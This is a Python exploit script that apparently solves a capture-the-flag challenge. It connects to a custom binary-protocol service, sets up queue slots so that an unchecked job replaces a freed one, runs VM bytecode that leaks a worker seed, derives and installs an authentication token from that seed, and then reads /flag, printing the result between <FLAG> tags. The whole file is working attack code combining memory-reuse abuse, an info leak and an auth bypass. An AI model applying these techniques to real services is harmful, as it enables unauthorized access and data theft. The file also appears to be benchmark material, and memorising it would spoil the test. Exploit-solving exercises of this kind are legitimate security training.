#!/usr/bin/env python3
import re
import socket
import struct
import sys

MASK = (1 << 64) - 1
MAGIC = 0x5144
VM_MAGIC = 0xEE3575B7


def crc32_custom(data: bytes) -> int:
    x = 0xFFFFFFFF
    for b in data:
        x ^= b
        for _ in range(8):
            if x & 1:
                x = (x >> 1) ^ 0xEDB88320
            else:
                x >>= 1
            x &= 0xFFFFFFFF
    return (~x) & 0xFFFFFFFF


def checksum(hdr12: bytes, data: bytes = b"") -> int:
    a = crc32_custom(hdr12)
    if data:
        d = crc32_custom(data)
        d = ((d << 1) | (d >> 31)) & 0xFFFFFFFF
        a ^= d
    return a ^ 0x0C806284


def make_packet(op: int, ident: int = 0, data: bytes = b"", x: int = 0) -> bytes:
    hdr12 = struct.pack("<HBBIHH", MAGIC, op, 0, ident, len(data), x)
    return hdr12 + struct.pack("<I", checksum(hdr12, data)) + data


def recv_exact(s: socket.socket, n: int) -> bytes:
    out = b""
    while len(out) < n:
        chunk = s.recv(n - len(out))
        if not chunk:
            raise EOFError("connection closed")
        out += chunk
    return out


def recv_packet(s: socket.socket):
    h = recv_exact(s, 16)
    magic, op, code, ident, ln, x, csum = struct.unpack("<HBBIHHI", h)
    data = recv_exact(s, ln) if ln else b""
    if magic != MAGIC:
        raise ValueError(f"bad magic: {magic:#x}")
    return op, code, ident, x, data


def send(s: socket.socket, op: int, ident: int = 0, data: bytes = b""):
    s.sendall(make_packet(op, ident, data))
    return recv_packet(s)


def benign_payload() -> bytes:
    p = bytearray(0x70)
    p[0] = 0x69  # worker FNV command, accepted by normal queue path
    return bytes(p)


def vm_payload(dwords) -> bytes:
    p = bytearray(0x70)
    p[0] = 0x92
    p[1] = len(dwords) * 4
    for i, x in enumerate(dwords):
        struct.pack_into("<I", p, 8 + i * 4, x & 0xFFFFFFFF)
    return bytes(p)


def queue_worker_exec(s: socket.socket, payload: bytes) -> bytes:
    """Fill queue with valid jobs, free one, put unchecked job there, then dispatch."""
    tids = []

    for _ in range(6):
        _, code, tid, _, _ = send(s, ord("Q"))
        if code != 0:
            raise RuntimeError(f"Q failed, code={code}")
        tids.append(tid)
        send(s, ord(","), tid, benign_payload())
        send(s, ord("("), tid)
        send(s, ord("g"), tid)

    send(s, ord("W"), tids[0])
    _, code, evil_tid, _, _ = send(s, ord("Q"))
    if code != 0:
        raise RuntimeError(f"evil Q failed, code={code}")

    send(s, ord(","), evil_tid, payload)
    _, code, _, _, data = send(s, ord("D"))

    # Best-effort cleanup so the same TCP session can run more worker commands.
    for tid in tids[1:] + [evil_tid]:
        try:
            send(s, ord("W"), tid)
        except Exception:
            pass

    if code != 0:
        raise RuntimeError(f"worker dispatch failed, code={code}, data={data!r}")
    return data


def rol64(x: int, n: int) -> int:
    n &= 63
    return ((x << n) | (x >> (64 - n))) & MASK


def fmix64(x: int) -> int:
    x &= MASK
    x ^= x >> 30
    x = (x * 0xBF58476D1CE4E5B9) & MASK
    x ^= x >> 27
    x = (x * 0x94D049BB133111EB) & MASK
    x ^= x >> 31
    return x & MASK


def auth_values(worker_seed: int):
    data = b"/flag" + b"\x00" * (0x68 - 5)

    # Mirrors worker's 0xad authentication mixer.
    rcx = (((0xAD << 56) | (5 << 48)) ^ worker_seed ^ 0x7B98A97884FA1989) & MASK
    for i, b in enumerate(data):
        v = (b + i + 0x31EBD2704002B967) & MASK
        rcx ^= v
        x = rcx
        x ^= x >> 30
        x = (x * 0xBF58476D1CE4E5B9) & MASK
        x ^= x >> 27
        x = (x * 0x94D049BB133111EB) & MASK
        x ^= x >> 31
        rcx = rol64(x, i + 9)

    token = fmix64(rcx ^ 0x4154544143484D45)
    z = fmix64(token ^ 0x54575F3A17BC3EBC)
    check32 = ((z & 0xFFFFFFFF) ^ (z >> 32)) & 0xFFFFFFFF
    return token, check32


def make_set_secret_payload(token: int) -> bytes:
    lo = token & 0xFFFFFFFF
    hi = token >> 32
    # VM: reg0.high=hi; reg0.low=lo; global_secret=reg0; halt
    return vm_payload([
        VM_MAGIC,
        0x59, 0, hi,
        0xCA, 0, lo,
        0x96, 0,
        0x00,
    ])


def make_flag_payload(check32: int) -> bytes:
    p = bytearray(0x70)
    p[0] = 0xAD
    p[1] = 5
    struct.pack_into("<I", p, 4, check32)
    p[8:13] = b"/flag"
    return bytes(p)


def solve(host: str, port: int) -> bytes:
    with socket.create_connection((host, port), timeout=10) as s:
        s.settimeout(10)

        # VM builtin 0xb9 index 0 leaks the worker seed used by /flag auth.
        leak = queue_worker_exec(s, vm_payload([VM_MAGIC, 0xB9, 0]))
        if len(leak) != 8:
            raise RuntimeError(f"bad seed leak: {leak!r}")
        worker_seed = struct.unpack("<Q", leak)[0]
        print(f"[+] leaked worker seed: {worker_seed:#018x}")

        token, check32 = auth_values(worker_seed)
        print(f"[+] computed auth token: {token:#018x}")

        queue_worker_exec(s, make_set_secret_payload(token))
        print("[+] installed auth token in worker")

        flag = queue_worker_exec(s, make_flag_payload(check32))
        return flag


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 31337

    flag = solve(host, port)
    text = flag.decode(errors="replace")
    print(text)

    m = re.search(r"[A-Za-z0-9_]+\{[^}\n]+\}", text)
    if m:
        print(f"<FLAG>{m.group(0)}</FLAG>")


if __name__ == "__main__":
    main()
